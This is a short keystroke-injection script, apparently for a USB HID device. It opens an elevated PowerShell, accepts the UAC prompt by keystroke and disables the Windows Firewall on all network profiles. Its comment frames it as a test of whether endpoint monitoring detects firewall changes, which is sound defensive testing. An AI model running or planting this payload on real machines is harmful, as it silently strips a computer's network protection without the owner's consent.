REM ============================================================
REM  Windows · Disable Firewall (All Profiles)
REM ============================================================
REM  Opens elevated PowerShell and disables Windows Firewall
REM  across all network profiles. For testing whether endpoint
REM  monitoring catches firewall state changes.
REM
REM  Requires admin privileges (UAC prompt).

DEFAULTDELAY 60

GUI r
DELAY 700
STRING powershell
CTRL SHIFT ENTER
DELAY 2000
ALT y
DELAY 1500
STRINGLN Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
STRINGLN exit
